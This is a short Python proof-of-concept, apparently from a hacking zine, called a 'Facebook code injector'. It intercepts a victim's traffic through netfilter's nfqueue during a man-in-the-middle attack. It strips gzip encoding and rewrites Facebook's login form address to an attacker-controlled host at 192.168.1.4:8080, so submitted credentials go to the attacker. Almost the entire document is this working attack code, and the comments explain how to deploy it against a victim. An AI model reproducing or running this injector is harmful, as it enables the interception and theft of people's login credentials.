#!/usr/bin/env python

# Facebook code injector
# Karagasidis "gatoni" Dimitris, http://gatoni.gr
# For 0x375 0x03
#
# Notes:
# This proof of concept code snippet is far from
# perfect. Currently it works on Internet Explorer 8.
# Some additional http header and packet manipulation
# must be done (I hope!) in order to make it work on
# other browsers. Also the http headers must be updated
# properly after manipulation (Content-Length for example).
# Make sure your have pushed all the traffic originating
# and destined for the victim in the userland queue of
# netfilter. And deployed mitm attack, obviously. Also
# it would be a really good idea to use some regular
# expressions for HTTP data analysis. Some fields in
# http headers might differ slightly from browser to
# browser.
#
# As always, no guarantees and best wishes. ;)

import nfqueue, zlib,time
from socket import AF_INET, AF_INET6
from dpkt import *

gzip_en = "Accept-Encoding: gzip, deflate"
none_en = "Accept-Encoding: chunked"
fb_lf = "https://login.facebook.com/login.php?login_attempt=1"
my_lf = "http://192.168.1.4:8080"

def processPacket( i, payload ):
	global gzip_en, none_en, fb_lf, my_lf
	pkt = ip.IP( payload.get_data() )
	if pkt.p == ip.IP_PROTO_TCP:
		data = pkt.tcp.data
		if data.find( "HTTP/1.1 400" ) != -1:
			payload.set_verdict( nfqueue.NF_DROP )
		if data.find( gzip_en ) != -1:
			old_len = len(data)
			pkt.tcp.data = data.replace( gzip_en, none_en )
			pkt.len = pkt.len - old_len + len(pkt.tcp.data)
			pkt.tcp.sum = 0
			pkt.sum = 0
			payload.set_verdict_modified( nfqueue.NF_ACCEPT, str(pkt), len(pkt) )
			return
		if data.find( fb_lf ):
			old_len = len(pkt.tcp.data)
			wsc = len(fb_lf) - len(my_lf)
			my_lf += wsc * " "
			pkt.tcp.data = data.replace( fb_lf, my_lf )
			pkt.len = pkt.len - old_len + len(pkt.tcp.data)
			pkt.tcp.sum = 0
			pkt.sum = 0
			payload.set_verdict_modified( nfqueue.NF_ACCEPT, str(pkt), len(pkt) )
			return
	payload.set_verdict( nfqueue.NF_ACCEPT )

try:
	q = nfqueue.queue()
	q.open()
	q.bind(AF_INET)
	q.set_callback( processPacket )
	q.create_queue(0)
	q.set_queue_maxlen(5000)
	q.try_run()
except KeyboardInterrupt:
	q.unbind( AF_INET )
	q.close()

